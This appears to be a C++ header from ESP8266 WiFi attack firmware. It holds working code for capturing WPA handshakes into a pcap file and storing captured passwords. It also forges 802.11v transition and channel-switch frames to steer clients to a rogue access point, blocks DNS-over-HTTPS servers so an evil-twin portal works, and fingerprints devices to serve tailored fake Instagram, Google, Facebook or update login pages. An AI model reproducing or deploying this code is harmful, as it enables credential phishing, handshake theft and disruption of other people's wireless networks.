#ifndef ATTACKS_H
#define ATTACKS_H

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include "config.h"

extern "C" {
  #include "user_interface.h"
}

void addLog(String msg, uint8_t level = LOG_INFO);
bool flushLogs();
String bytesToStr(const uint8_t* b, uint32_t size);
void sendDeauth(uint8_t ch, uint8_t* bssid, int burstCount);

struct Network {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
  bool encrypted;
  bool wpa3;
  bool pmf;
  uint8_t clients;
};

Network networks[MAX_NETWORKS];
Network selectedNetwork;
Network multiTargets[MAX_NETWORKS];
int multiTargetCount = 0;

bool deauthingActive = false;
bool beaconActive = false;
bool probeActive = false;
bool hotspotActive = false;
bool scanning = false;

String capturedPasswords[CAPTURED_MAX];
int capturedCount = 0;
uint8_t currentPhishingPage = PHISHING_LANDING;

bool hijackActive = false;
bool extenderActive = false;
bool deauthAllActive = false;
bool preciseDeauthActive = false;
bool trueDeauthActive = false;
bool rogueAPActive = false;
bool apHidden = false;

unsigned long lastScan = 0;
unsigned long lastDeauth = 0;
unsigned long lastBeacon = 0;
unsigned long lastProbe = 0;
unsigned long lastHijack = 0;
unsigned long lastDeauthAll = 0;
unsigned long lastPreciseDeauth = 0;
unsigned long lastTrueDeauth = 0;
uint8_t currentChannel = 1;

unsigned long lastStateSave = 0;
bool dirtyState = false;

bool wifiClientConnected = false;
String wifiClientSSID = "";
String wifiClientPassword = "";
bool internetSharingEnabled = false;

String beaconSSIDs[MAX_SSIDS];
int beaconSSIDCount = 0;
int displayTimeout = 60;
bool autoSelectAll = false;

// --- Probe Monitor ---
struct ProbeEntry {
  uint8_t mac[6];
  String ssid;
  unsigned long time;
};
ProbeEntry probeLog[PROBE_MAX];
int probeCount = 0;

// --- Client Discovery ---
struct ClientEntry {
  uint8_t mac[6];
  uint8_t bssid[6];
  int ch;
  unsigned long time;
};
ClientEntry clientList[CLIENT_MAX];
int clientCount = 0;

// --- DNS Query Log (for Evil-Twin) ---
struct DNSEntry {
  String domain;
  uint8_t clientMAC[6];
  unsigned long time;
};
DNSEntry dnsLog[DNS_LOG_MAX];
int dnsLogCount = 0;

  // --- EAPOL / WPA Handshake Detection ---
#define PCAP_GLOBAL_HEADER_LEN 24
#define PCAP_PKT_HEADER_LEN 16
#define EAPOL_RAW_SIZE 64
struct EAPOLEntry {
  uint8_t bssid[6];
  uint8_t clientMAC[6];
  uint8_t messageType;
  unsigned long time;
  uint8_t rawData[EAPOL_RAW_SIZE];
  uint16_t rawLen;
};
EAPOLEntry eapolLog[EAPOL_MAX];
int eapolCount = 0;
bool handshakeCaptureActive = false;
unsigned long handshakeCaptureStart = 0;
uint8_t handshakeTargetBSSID[6];
uint8_t handshakeTargetCH = 0;
bool handshakeComplete = false;

static void saveHandshakeBinary() {
  File f = LittleFS.open("/capture.pcap", "w");
  if (!f) return;
  uint8_t pcapHdr[24] = {
    0xD4, 0xC3, 0xB2, 0xA1, 0x02, 0x00, 0x04, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
  };
  f.write(pcapHdr, 24);
  for (int i = 0; i < eapolCount; i++) {
    if (eapolLog[i].rawLen > 0) {
      uint32_t ts_sec = eapolLog[i].time / 1000;
      uint32_t ts_usec = (eapolLog[i].time % 1000) * 1000;
      uint8_t pktHdr[16];
      memcpy(pktHdr, &ts_sec, 4);
      memcpy(pktHdr + 4, &ts_usec, 4);
      memcpy(pktHdr + 8, &eapolLog[i].rawLen, 4);
      memcpy(pktHdr + 12, &eapolLog[i].rawLen, 4);
      f.write(pktHdr, 16);
      f.write(eapolLog[i].rawData, eapolLog[i].rawLen);
    }
  }
  f.close();
  addLog("Handshake saved to /capture.pcap (" + String(eapolCount) + " frames)", LOG_WARN);
}

// --- Extender State Machine ---
enum ExtenderState {
  EXTENDER_IDLE,
  EXTENDER_SCANNING,
  EXTENDER_CONNECTING,
  EXTENDER_CONNECTED,
  EXTENDER_ERROR
};
ExtenderState extenderState = EXTENDER_IDLE;
unsigned long extenderConnectStart = 0;

// --- WiFi Connect State Machine ---
enum WiFiConnectState {
  WIFI_IDLE,
  WIFI_CONNECTING,
  WIFI_RECONNECTING
};
WiFiConnectState wifiConnState = WIFI_IDLE;
String wifiPendingSSID = "";
String wifiPendingPass = "";
unsigned long wifiConnectStart = 0;

unsigned long deauthPkts = 0;
unsigned long beaconPkts = 0;
unsigned long probePkts = 0;
unsigned long totalPkts = 0;

// --- Multi-page Evil-Twin ---
int phishingStep = 0; // 0 = first page, 1 = second page, etc.

// --- Reactive Phishing Verification ---
uint8_t phishingVerifyState = PHISHING_VERIFY_IDLE;
unsigned long phishingVerifyStart = 0;

// --- XXTEA Encryption (replaces simple XOR) ---
static void xxteaEncrypt(uint32_t* v, int n, const uint32_t* key) {
  uint32_t y, z, sum, delta = 0x9E3779B9;
  int rounds = 6 + 52 / n;
  sum = 0; y = v[0];
  do {
    sum += delta;
    uint32_t e = (sum >> 2) & 3;
    for (int p = 0; p < n - 1; p++) {
      z = v[p + 1];
      v[p] += ((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z));
      y = v[p];
    }
    z = v[0];
    v[n - 1] += ((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(n - 1 & 3) ^ e] ^ z));
    y = v[n - 1];
  } while (--rounds);
}

static void xxteaDecrypt(uint32_t* v, int n, const uint32_t* key) {
  uint32_t y, z, sum, delta = 0x9E3779B9;
  int rounds = 6 + 52 / n;
  sum = rounds * delta; y = v[0];
  do {
    uint32_t e = (sum >> 2) & 3;
    for (int p = n - 1; p > 0; p--) {
      z = v[p - 1];
      v[p] -= ((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z));
      y = v[p];
    }
    z = v[n - 1];
    v[0] -= ((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(0 & 3) ^ e] ^ z));
    y = v[0];
    sum -= delta;
  } while (--rounds);
}

static uint8_t xxteaKey[16] = {0};

static void initXXTEAKey() {
  uint8_t mac[MAC_LEN] = {0};
  WiFi.macAddress(mac);
  uint32_t chipId = ESP.getChipId();
  uint32_t flashId = ESP.getFlashChipId() ^ 0x5A5A5A5A;
  for (int i = 0; i < 16; i++) {
    uint8_t idByte = (uint8_t)(chipId >> ((i * 5) % 28)) ^ (uint8_t)(flashId >> ((i * 7) % 28));
    xxteaKey[i] = mac[i % MAC_LEN] ^ idByte ^ (uint8_t)(0xA5 + i * 7);
  }
}

static String encryptString(const String& input) {
  if (xxteaKey[0] == 0) initXXTEAKey();
  int len = input.length();
  if (len == 0) return input;
  int paddedLen = ((len + 3) / 4 + 1) * 4;
  uint32_t* buf = (uint32_t*)malloc(paddedLen);
  memset(buf, 0, paddedLen);
  memcpy(buf, input.c_str(), len);
  buf[paddedLen / 4 - 1] = len;
  int n = paddedLen / 4;
  xxteaEncrypt(buf, n, (uint32_t*)xxteaKey);
  String result;
  result.reserve(paddedLen + 4);
  result += (char)(n & 0xFF);
  result += (char)((n >> 8) & 0xFF);
  result += (char)((n >> 16) & 0xFF);
  result += (char)((n >> 24) & 0xFF);
  for (int i = 0; i < paddedLen; i++) {
    result += (char)(((uint8_t*)buf)[i]);
  }
  free(buf);
  return result;
}

static String decryptString(const String& input) {
  if (xxteaKey[0] == 0) initXXTEAKey();
  if (input.length() < 4) return input;
  int n = (uint8_t)input[0] | ((uint8_t)input[1] << 8) | ((uint8_t)input[2] << 16) | ((uint8_t)input[3] << 24);
  int paddedLen = n * 4;
  if (paddedLen <= 0 || paddedLen > 512 || (unsigned int)paddedLen + 4 > input.length()) return input;
  uint32_t* buf = (uint32_t*)malloc(paddedLen);
  for (int i = 0; i < paddedLen; i++) {
    ((uint8_t*)buf)[i] = input[4 + i];
  }
  xxteaDecrypt(buf, n, (uint32_t*)xxteaKey);
  int origLen = buf[n - 1];
  if (origLen > paddedLen || origLen < 0) { free(buf); return input; }
  String result;
  result.reserve(origLen);
  for (int i = 0; i < origLen; i++) result += (char)((uint8_t*)buf)[i];
  free(buf);
  return result;
}

// --- Input Sanitization (2026 hardening) ---
static String sanitizeInput(const String& input, size_t maxLen = 128) {
  String out;
  out.reserve(min(input.length(), maxLen));
  for (size_t i = 0; i < input.length() && out.length() < maxLen; i++) {
    char c = input[i];
    if (c >= 0x20 && c < 0x7F) {
      if (c == '<') { out += "&lt;"; }
      else if (c == '>') { out += "&gt;"; }
      else if (c == '"') { out += "&quot;"; }
      else if (c == '\'') { out += "&#39;"; }
      else if (c == '&') { out += "&amp;"; }
      else { out += c; }
    }
  }
  return out;
}

static String sanitizeNumeric(const String& input) {
  String out;
  out.reserve(input.length());
  for (size_t i = 0; i < input.length(); i++) {
    if (input[i] >= '0' && input[i] <= '9') out += input[i];
  }
  return out;
}

static String sanitizeFilename(const String& input) {
  String out;
  out.reserve(input.length());
  for (size_t i = 0; i < input.length(); i++) {
    char c = input[i];
    if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
        (c >= '0' && c <= '9') || c == '.' || c == '_' || c == '-' || c == '/') {
      out += c;
    }
  }
  return out;
}

// --- Adaptive Signal Strength (2026 stealth) ---
static int8_t targetAP_RSSI = -50;
static int8_t lastRogueAP_TX = 20;

static int8_t getAdaptiveTXPower(int8_t targetRSSI) {
  if (targetRSSI == 0) return 20;
  int8_t txPower = targetRSSI + 10;
  if (txPower < 0) txPower = 2;
  if (txPower > 20) txPower = 20;
  return txPower;
}

static void applyAdaptiveRoguePower(int8_t targetRSSI) {
  int8_t newPower = getAdaptiveTXPower(targetRSSI);
  if (newPower != lastRogueAP_TX) {
    WiFi.setOutputPower(newPower / 20.0f * 20.5f);
    lastRogueAP_TX = newPower;
  }
}

// --- DoH (DNS over HTTPS) Mitigation ---
static const uint32_t dohBlockIPs[] = {
  0x01010101, // 1.1.1.1 Cloudflare
  0x01010001, // 1.0.0.1 Cloudflare
  0x08080808, // 8.8.8.8 Google
  0x08080404, // 8.8.4.4 Google
  0x90909090, // 9.9.9.9 Quad9
  0x90909091, // 9.9.9.10 Quad9
  0x26262626, // 149.112.112.112 Quad9
  0x14141414, // 20.20.20.20
};
static const int dohBlockIPCount = sizeof(dohBlockIPs) / sizeof(dohBlockIPs[0]);
static const char* dohCanaryDomains[] = {
  "use-application-dns.net",
  "captive.apple.com",
  "connectivitycheck.gstatic.com",
  "connectivitycheck.android.com",
  "clients3.google.com"
};
static const int dohCanaryCount = sizeof(dohCanaryDomains) / sizeof(dohCanaryDomains[0]);

static bool isDOHProviderIP(uint32_t ip) {
  for (int i = 0; i < dohBlockIPCount; i++) {
    if (ip == dohBlockIPs[i]) return true;
  }
  return false;
}

static bool isDOHCanaryDomain(const String& domain) {
  String lower = domain;
  lower.toLowerCase();
  for (int i = 0; i < dohCanaryCount; i++) {
    if (lower.indexOf(dohCanaryDomains[i]) >= 0) return true;
  }
  return false;
}

// --- 802.11v BSS Transition Management ---
static void sendBSSTransitionRequest(uint8_t ch, uint8_t* apBSSID, uint8_t* rogueBSSID) {
  uint8_t pkt[16] = {0};
  pkt[0] = 0x05;                 // Category: Radio Measurement
  pkt[1] = 0x07;                 // Action: BSS Transition Management Request
  pkt[2] = 0x00;                 // Dialog Token
  pkt[3] = 0x01;                 // Request Mode: Preferred Candidate List Included
  pkt[4] = 0x00; pkt[5] = 0x00; // Disassociation Timer
  pkt[6] = 0x00;                 // Validity Interval
  pkt[7] = 0x01;                 // Candidate ID
  memcpy(&pkt[8], rogueBSSID, 6); // BSSID of rogue AP
  pkt[14] = 0x00;                // Candidate Status: Accept
  pkt[15] = 0x00;                // Preference

  uint8_t actionFrame[40] = {0};
  actionFrame[0] = 0xD0; actionFrame[1] = 0x00;
  memset(&actionFrame[4], 0xFF, 6);  // DA = broadcast
  memcpy(&actionFrame[10], apBSSID, 6); // SA = AP BSSID
  memcpy(&actionFrame[16], apBSSID, 6); // BSSID = AP BSSID
  memcpy(&actionFrame[24], pkt, 16);    // Action body

  wifi_set_channel(ch);
  for (int i = 0; i < 5; i++) {
    wifi_send_pkt_freedom(actionFrame, 40, 0);
    yield();
  }
  addLog("802.11v BSS Transition Request sent", LOG_WARN);
}

// --- Channel Switch Announcement (CSA) Beacon ---
static void sendCSA(uint8_t ch, uint8_t* bssid, String ssid, uint8_t newCh) {
  uint8_t ssidLen = ssid.length();
  if (ssidLen > SSID_MAX_LEN) ssidLen = SSID_MAX_LEN;
  uint8_t beacon[128] = {0};
  beacon[0] = 0x80; beacon[1] = 0x00;
  beacon[2] = 0x00; beacon[3] = 0x00;
  memcpy(&beacon[4], bssid, 6);
  memcpy(&beacon[10], bssid, 6);
  memcpy(&beacon[16], bssid, 6);
  beacon[22] = 0x00; beacon[23] = 0x00;
  beacon[24] = 0x01; beacon[25] = 0x08;
  beacon[26] = 0x02; beacon[27] = 0x04;
  beacon[28] = 0x0B; beacon[29] = 0x16;
  beacon[30] = 0x0C; beacon[31] = 0x12;
  beacon[32] = 0x24; beacon[33] = 0x30;
  beacon[34] = 0x32; beacon[35] = 0x03;
  beacon[36] = 0x48; beacon[37] = 0x60; beacon[38] = 0x6C;
  beacon[39] = 0x00; beacon[40] = ssidLen;
  for (int i = 0; i < ssidLen; i++) beacon[41 + i] = ssid.charAt(i);
  int pktLen = 41 + ssidLen;
  // CSA Element (ID 37, len 3: Mode=1, New Channel, Count=0)
  beacon[pktLen] = 37;
  beacon[pktLen + 1] = 3;
  beacon[pktLen + 2] = 1;     // Mode: Switch immediately
  beacon[pktLen + 3] = newCh; // New Channel Number
  beacon[pktLen + 4] = 0;     // Count: 0 = immediate
  pktLen += 5;

  wifi_set_channel(ch);
  for (int i = 0; i < BEACON_BURST_COUNT; i++) {
    wifi_send_pkt_freedom(beacon, pktLen, 0);
    if (i % 5 == 0) yield();
  }
  beaconPkts += BEACON_BURST_COUNT;
  totalPkts += BEACON_BURST_COUNT;
  addLog("CSA beacon injected: ch" + String(ch) + " -> " + String(newCh), LOG_WARN);
}

// --- PMF Detection & WPA3 Countermeasures ---
static bool hasPMF(const Network& net) {
  return net.wpa3 || net.pmf;
}

static bool shouldUseAlternativeAttack(const Network& net) {
  if (net.wpa3 || net.pmf) {
    return true;
  }
  return false;
}

// --- DHCP Fingerprinting (802.11 MAC Randomization Bypass) ---

struct DeviceFingerprint {
  uint8_t clientMAC[6];
  uint8_t dhcpOpt55[DHCP_OPTION_55_MAX];
  uint8_t opt55Len;
  String vendorClass;
  String osClass;
  unsigned long lastSeen;
  int confidence;
};

static DeviceFingerprint fingerprints[DHCP_FINGERPRINT_MAX];
static int fingerprintCount = 0;

static const char* classifyOS_DHCP(const uint8_t* opt55, uint8_t len, const String& vendorClass) {
  if (vendorClass.indexOf("android") >= 0 || vendorClass.indexOf("Android") >= 0) return "Android";
  if (vendorClass.indexOf("MSFT") >= 0) return "Windows";
  if (vendorClass.indexOf("iPad") >= 0 || vendorClass.indexOf("iPhone") >= 0) return "iOS";
  if (vendorClass.indexOf("Linux") >= 0) return "Linux";
  if (len >= 4 && opt55[0] == 1 && opt55[1] == 28 && opt55[2] == 3 && opt55[3] == 15) return "Windows";
  if (len >= 3 && opt55[0] == 1 && opt55[1] == 121 && opt55[2] == 3) return "Android";
  if (len >= 4 && opt55[0] == 1 && opt55[1] == 6 && opt55[2] == 12 && opt55[3] == 15) return "iOS";
  return "Unknown";
}

static int findFingerprint(const uint8_t* opt55, uint8_t len, const String& vendorClass) {
  for (int i = 0; i < fingerprintCount; i++) {
    if (fingerprints[i].opt55Len == len &&
        memcmp(fingerprints[i].dhcpOpt55, opt55, len) == 0 &&
        fingerprints[i].vendorClass == vendorClass) {
      return i;
    }
  }
  return -1;
}

static int findFingerprintByMAC(const uint8_t* mac) {
  for (int i = 0; i < fingerprintCount; i++) {
    if (memcmp(fingerprints[i].clientMAC, mac, 6) == 0) return i;
  }
  return -1;
}

static void updateFingerprint(const uint8_t* mac, const uint8_t* opt55, uint8_t opt55Len, const String& vendorClass) {
  int idx = findFingerprint(opt55, opt55Len, vendorClass);
  if (idx >= 0) {
    fingerprints[idx].lastSeen = millis();
    fingerprints[idx].confidence = min(100, fingerprints[idx].confidence + 10);
    memcpy(fingerprints[idx].clientMAC, mac, 6);
    return;
  }
  idx = findFingerprintByMAC(mac);
  if (idx >= 0) {
    memcpy(fingerprints[idx].dhcpOpt55, opt55, min(opt55Len, (uint8_t)DHCP_OPTION_55_MAX));
    fingerprints[idx].opt55Len = min(opt55Len, (uint8_t)DHCP_OPTION_55_MAX);
    fingerprints[idx].vendorClass = vendorClass;
    fingerprints[idx].osClass = classifyOS_DHCP(opt55, opt55Len, vendorClass);
    fingerprints[idx].lastSeen = millis();
    fingerprints[idx].confidence = min(100, fingerprints[idx].confidence + 20);
    return;
  }
  if (fingerprintCount < DHCP_FINGERPRINT_MAX) {
    memcpy(fingerprints[fingerprintCount].clientMAC, mac, 6);
    memcpy(fingerprints[fingerprintCount].dhcpOpt55, opt55, min(opt55Len, (uint8_t)DHCP_OPTION_55_MAX));
    fingerprints[fingerprintCount].opt55Len = min(opt55Len, (uint8_t)DHCP_OPTION_55_MAX);
    fingerprints[fingerprintCount].vendorClass = vendorClass;
    fingerprints[fingerprintCount].osClass = classifyOS_DHCP(opt55, opt55Len, vendorClass);
    fingerprints[fingerprintCount].lastSeen = millis();
    fingerprints[fingerprintCount].confidence = 50;
    fingerprintCount++;
  }
}

// DHCP Option parsing in promiscuous callback stub
static void parseDHCP(uint8_t* buf, uint16_t len, uint8_t* clientMAC) {
  if (len < 240) return;
  int dhcpStart = -1;
  for (int i = 0; i < (int)len - 8; i++) {
    if (buf[i] == 0x08 && buf[i+1] == 0x00 && buf[i+2] == 0x00 && buf[i+3] == 0x00 &&
        buf[i+4] == 0x00 && buf[i+5] == 0x00 && buf[i+6] == 0x00 && buf[i+7] == 0x00) {
      dhcpStart = i + 8;
      break;
    }
  }
  if (dhcpStart < 0 || dhcpStart >= (int)len - 60) return;
  uint8_t opt55[DHCP_OPTION_55_MAX];
  uint8_t opt55Len = 0;
  String vendorClass = "";
  int pos = dhcpStart + 4 + 12 + 16 + 16 + 64 + 4 + 4 + 4; // skip fixed DHCP fields
  while (pos < (int)len - 2 && buf[pos] != 255) {
    if (buf[pos] == 0) { pos++; continue; }
    uint8_t optLen = buf[pos + 1];
    if (pos + 2 + optLen > (int)len) break;
    if (buf[pos] == 55 && opt55Len == 0) {
      opt55Len = min(optLen, (uint8_t)DHCP_OPTION_55_MAX);
      memcpy(opt55, &buf[pos + 2], opt55Len);
    }
    if (buf[pos] == 60) {
      for (int c = 0; c < optLen; c++) vendorClass += (char)buf[pos + 2 + c];
    }
    pos += 2 + optLen;
  }
  if (opt55Len > 0) {
    updateFingerprint(clientMAC, opt55, opt55Len, vendorClass);
  }
}

// --- Automated UI Adaptation (User-Agent Based) ---
enum ClientOS {
  OS_UNKNOWN,
  OS_IOS,
  OS_ANDROID,
  OS_WINDOWS,
  OS_MAC,
  OS_LINUX
};

static ClientOS detectOS(const String& userAgent) {
  String ua = userAgent;
  ua.toLowerCase();
  if (ua.indexOf("iphone") >= 0 || ua.indexOf("ipad") >= 0 || ua.indexOf("ipod") >= 0) return OS_IOS;
  if (ua.indexOf("android") >= 0) return OS_ANDROID;
  if (ua.indexOf("windows") >= 0) return OS_WINDOWS;
  if (ua.indexOf("macintosh") >= 0 || ua.indexOf("mac os") >= 0) return OS_MAC;
  if (ua.indexOf("linux") >= 0) return OS_LINUX;
  return OS_UNKNOWN;
}

static bool isMobile(const String& userAgent) {
  String ua = userAgent;
  ua.toLowerCase();
  return ua.indexOf("mobile") >= 0 || ua.indexOf("iphone") >= 0 || ua.indexOf("android") >= 0;
}

static uint8_t autoSelectPhishingPage(const String& userAgent, uint8_t currentSetting) {
  if (currentSetting != PHISHING_LANDING && currentSetting != PHISHING_CUSTOM) {
    return currentSetting;
  }
  ClientOS os = detectOS(userAgent);
  if (isMobile(userAgent)) {
    return PHISHING_INSTAGRAM;
  }
  switch (os) {
    case OS_IOS:    return PHISHING_UPDATE;
    case OS_ANDROID: return PHISHING_GOOGLE;
    case OS_WINDOWS: return PHISHING_FACEBOOK;
    default:        return PHISHING_GENERIC;
  }
}

// --- Dynamic Resource Management (Heap-Aware) ---
static void lruEvictProbes() {
  if (probeCount < PROBE_MAX / 2) return;
  int oldest = 0;
  for (int i = 1; i < probeCount; i++) {
    if (probeLog[i].time < probeLog[oldest].time) oldest = i;
  }
  for (int i = oldest; i < probeCount - 1; i++) probeLog[i] = probeLog[i + 1];
  probeCount--;
}

static void lruEvictClients() {
  if (clientCount < CLIENT_MAX / 2) return;
  int oldest = 0;
  for (int i = 1; i < clientCount; i++) {
    if (clientList[i].time < clientList[oldest].time) oldest = i;
  }
  for (int i = oldest; i < clientCount - 1; i++) clientList[i] = clientList[i + 1];
  clientCount--;
}

// --- Log Levels Optimized ---
#define LOG_MAX 4
#define LOG_BUFFER_MAX 2048
struct LogEntry {
  unsigned long timestamp;
  uint8_t level;
  String message;
};
LogEntry logEntries[LOG_MAX];
int logCount = 0;
int logHead = 0;
unsigned long lastLogFlush = 0;
String logBuffer = "";
unsigned int logBufferSize = 0;

static bool heapLowPressure() {
  return ESP.getFreeHeap() < HEAP_WARNING_THRESHOLD + 2000;
}

static void heapPressureEvict() {
  if (!heapLowPressure()) return;
  if (probeCount > PROBE_MAX - 2) { probeCount = PROBE_MAX / 2; addLog("Heap pressure: evicted probes", LOG_WARN); }
  if (clientCount > CLIENT_MAX - 2) { clientCount = CLIENT_MAX / 2; addLog("Heap pressure: evicted clients", LOG_WARN); }
  if (logCount > LOG_MAX - 2) { logCount = LOG_MAX / 2; addLog("Heap pressure: evicted logs", LOG_WARN); }
  if (dnsLogCount > DNS_LOG_MAX - 1) { dnsLogCount = DNS_LOG_MAX / 2; }
}

// --- PIN Lock State ---
String webPin = "";
int pinAttempts = 0;
unsigned long pinLockoutUntil = 0;
bool pinUnlocked = false;
unsigned long pinUnlockTime = 0;
#define PIN_SESSION_MS 300000

// --- Rate Limiting ---
unsigned long lastCaptureTime = 0;
int captureCountThisMin = 0;
unsigned long captureMinStart = 0;

// --- Heap Tracking ---
size_t heapLowMark = 0xFFFFFFFF;
unsigned long lastHeapCheck = 0;

static void updateHeapLowMark() {
  size_t current = ESP.getFreeHeap();
  if (current < heapLowMark) heapLowMark = current;
}

String htmlEntities(String input) {
  input.replace("&", "&amp;");
  input.replace("<", "&lt;");
  input.replace(">", "&gt;");
  input.replace("\"", "&quot;");
  input.replace("'", "&#39;");
  return input;
}

void addLog(String msg, uint8_t level) {
  int idx;
  if (logCount < LOG_MAX) {
    idx = logCount;
    logCount++;
  } else {
    idx = logHead;
    logHead = (logHead + 1) % LOG_MAX;
  }
  logEntries[idx].timestamp = millis();
  logEntries[idx].level = level;
  logEntries[idx].message = msg;

  unsigned long t = millis() / 1000;
  char timeStr[24];
  int n = snprintf(timeStr, sizeof(timeStr), "[%lum %lus]", (unsigned long)(t/60), (unsigned long)(t%60));
  if (n < 0 || n >= (int)sizeof(timeStr)) timeStr[sizeof(timeStr)-1] = '\0';
  String levelStr = (level == LOG_ERR) ? "[ERR]" : (level == LOG_WARN) ? "[WARN]" : "[INFO]";
  String formatted = String(timeStr) + levelStr + " " + msg + "\n";
  
  if (logBufferSize + formatted.length() > LOG_BUFFER_MAX) {
    logBuffer = formatted;
    logBufferSize = formatted.length();
  } else {
    logBuffer += formatted;
    logBufferSize += formatted.length();
  }
  
  if (logBufferSize >= LOG_BUFFER_MAX / 2) flushLogs();
  
  updateHeapLowMark();
}

bool flushLogs() {
  if (logBuffer.length() == 0) return true;
  unsigned long fsize = 0;
  if (LittleFS.exists("/log.txt")) {
    File cf = LittleFS.open("/log.txt", "r");
    if (cf) { fsize = cf.size(); cf.close(); }
  }
  if (fsize > LOG_FILE_MAX_SIZE) {
    LittleFS.remove("/log.txt");
  }
  File f = LittleFS.open("/log.txt", "a");
  if (!f) return false;
  size_t written = f.print(logBuffer);
  f.close();
  logBuffer = "";
  logBufferSize = 0;
  lastLogFlush = millis();
  return written > 0;
}

String getLogsHTML() {
  String html;
  File logFile = LittleFS.open("/log.txt", "r");
  if (logFile) {
    while (logFile.available()) {
      String line = logFile.readStringUntil('\n');
      line.trim();
      if (line.length() > 0) {
        String cls = "capture-box";
        if (line.indexOf("[ERR]") >= 0) cls = "capture-box" + String(" red");
        else if (line.indexOf("[WARN]") >= 0) cls = "capture-box";
        html += "<div class='" + cls + "'>" + htmlEntities(line) + "</div>";
      }
    }
    logFile.close();
  }
  if (html.length() == 0) html = "<div class='empty'>No logs yet</div>";
  return html;
}

String escapeJSON(const String& input) {
  String out;
  out.reserve(input.length() + 4);
  for (size_t i = 0; i < input.length(); i++) {
    char c = input[i];
    if (c == '"') out += "\\\"";
    else if (c == '\\') out += "\\\\";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else if (c == '\t') out += "\\t";
    else out += c;
  }
  return out;
}

String getLogsJSON() {
  String json = "[";
  for (int i = 0; i < logCount; i++) {
    if (i > 0) json += ",";
    json += "{\"t\":" + String(logEntries[i].timestamp / 1000) + ",\"l\":" + String(logEntries[i].level) + ",\"m\":\"" + escapeJSON(logEntries[i].message) + "\"}";
  }
  json += "]";
  return json;
}

// --- Promiscuous Callback for Probe + EAPOL Monitoring ---
void promiscuousCallback(uint8_t *buf, uint16_t len) {
  if (len < 26) return;
  uint8_t frameType = buf[0] & 0xFC;

  // --- Probe Request Detection (type 0x40 = probe req) ---
  if (frameType == 0x40) {
    uint8_t mac[MAC_LEN];
    memcpy(mac, &buf[10], MAC_LEN);

    int ssidLen = buf[25];
    if (ssidLen > SSID_MAX_LEN) ssidLen = SSID_MAX_LEN;
    int remaining = len - 26;
    if (ssidLen > remaining) ssidLen = remaining;
    String ssid = "";
    for (int i = 0; i < ssidLen; i++) {
      ssid += (char)buf[26 + i];
    }

    for (int i = 0; i < probeCount; i++) {
      if (memcmp(probeLog[i].mac, mac, 6) == 0 && probeLog[i].ssid == ssid) {
        probeLog[i].time = millis();
        return;
      }
    }

    if (probeCount < PROBE_MAX) {
      memcpy(probeLog[probeCount].mac, mac, 6);
      probeLog[probeCount].ssid = ssid;
      probeLog[probeCount].time = millis();
      probeCount++;
    } else {
      for (int i = 1; i < PROBE_MAX; i++) probeLog[i-1] = probeLog[i];
      memcpy(probeLog[PROBE_MAX-1].mac, mac, 6);
      probeLog[PROBE_MAX-1].ssid = ssid;
      probeLog[PROBE_MAX-1].time = millis();
    }
    return;
  }

  // --- EAPOL / WPA Handshake Detection (data frame with EAPOL ethertype) ---
  bool isData = (frameType == 0x08) || (frameType == 0x88); // data or QoS data
  if (isData && handshakeCaptureActive && len >= 36) {
    int llcOffset = 24;
    bool isQoS = (buf[0] & 0x8C) == 0x88;
    if (isQoS) llcOffset = 26; // QoS data
    if (isQoS && (buf[1] & 0x80)) llcOffset += 4; // +HTC (HT control)
    
    if (len >= (unsigned)(llcOffset + 10)) {
      uint16_t etherType = (uint16_t)buf[llcOffset + 6] << 8 | buf[llcOffset + 7];
      if (etherType == ETHER_TYPE_EAPOL) {
        uint8_t eapolType = buf[llcOffset + 8 + 1]; // EAPOL frame type
        uint8_t *pBSSID = &buf[16]; // Address 3 = BSSID
        uint8_t *pClient = &buf[10]; // Address 2 = transmitter (TA)
        
        if (memcmp(pBSSID, handshakeTargetBSSID, 6) == 0 || memcmp(pClient, handshakeTargetBSSID, 6) == 0) {
          uint8_t msgType = buf[llcOffset + 10 + 6 + 1]; // Key Info (Message type in EAPOL-Key)
          
          bool found = false;
          for (int j = 0; j < eapolCount && j < EAPOL_MAX; j++) {
            if (memcmp(eapolLog[j].clientMAC, pClient, 6) == 0 && eapolLog[j].messageType == msgType) {
              eapolLog[j].time = millis();
              found = true;
              break;
            }
          }
          
          if (!found && eapolCount < EAPOL_MAX) {
            memcpy(eapolLog[eapolCount].bssid, pBSSID, 6);
            memcpy(eapolLog[eapolCount].clientMAC, pClient, 6);
            eapolLog[eapolCount].messageType = msgType;
            eapolLog[eapolCount].time = millis();
            int copyLen = len;
            if (copyLen > EAPOL_RAW_SIZE) copyLen = EAPOL_RAW_SIZE;
            eapolLog[eapolCount].rawLen = copyLen;
            memcpy(eapolLog[eapolCount].rawData, buf, copyLen);
            eapolCount++;
            
            String clientStr = bytesToStr(pClient, 6);
            addLog("EAPOL msg" + String(msgType) + " from " + clientStr, LOG_WARN);
            
            if (eapolCount >= 4) {
              handshakeComplete = true;
              handshakeCaptureActive = false;
              saveHandshakeBinary();
              addLog("WPA handshake CAPTURED for target!", LOG_WARN);
            }
          }
        }
      }
    }
  }
}

// --- Client Discovery from Probe Requests ---
void updateClientList(uint8_t* mac, uint8_t* bssid, int ch) {
  for (int i = 0; i < clientCount; i++) {
    if (memcmp(clientList[i].mac, mac, 6) == 0) {
      clientList[i].time = millis();
      return;
    }
  }
  if (clientCount < CLIENT_MAX) {
    memcpy(clientList[clientCount].mac, mac, 6);
    memcpy(clientList[clientCount].bssid, bssid, 6);
    clientList[clientCount].ch = ch;
    clientList[clientCount].time = millis();
    clientCount++;
  }
}

void clearNetworks() {
  for (int i = 0; i < MAX_NETWORKS; i++) {
    networks[i].ssid = "";
    networks[i].ch = 0;
    networks[i].rssi = 0;
    networks[i].encrypted = false;
    networks[i].clients = 0;
    memset(networks[i].bssid, 0, MAC_LEN);
  }
}

